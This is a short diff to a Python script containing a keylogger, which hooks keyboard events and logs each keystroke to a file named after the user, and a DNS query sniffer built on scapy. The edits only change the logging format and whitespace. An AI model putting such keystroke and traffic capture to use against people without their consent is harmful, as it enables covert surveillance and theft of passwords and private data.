@@ -6,7 +6,7 @@ import scapy.all as scapy
 #key logger
 def key_logger():
     print("Key Logger start and running..")
-    logging.basicConfig(filename="keylog-"+user_name()+current_time()+".txt", level=logging.INFO, format="%(asctime)s: %(message)s")
+    logging.basicConfig(filename="keylog-"+user_name()+current_time()+".txt", level=logging.INFO, filemode='a', format='%(asctime)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
 
     # define a callback function to process the keystrokes
     def on_key_press(event):
@@ -14,7 +14,7 @@ def key_logger():
         key = event.name
         # write the keystroke to the log file
         logging.info(key)
-        
+
     # hook the keyboard events with the callback function
     keyboard.on_press(on_key_press)
     # start the hook and keep the script running
@@ -25,7 +25,7 @@ def dns_logger():
     print("Npcap is required for Dns Logger. Get Npcap from https://npcap.com/#download")
     print("DNS Quary Logger start and running..")
     # Set up the logging configuration
-    logging.basicConfig(filename='dnslog-'+user_name()+current_time()+'.txt', level=logging.INFO,  format='%(asctime)s: %(message)s')
+    logging.basicConfig(filename='dnslog-'+user_name()+current_time()+'.txt', level=logging.INFO, filemode='a', format='%(asctime)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
 
     # Define a function to process each packet
     def process_packet(packet):
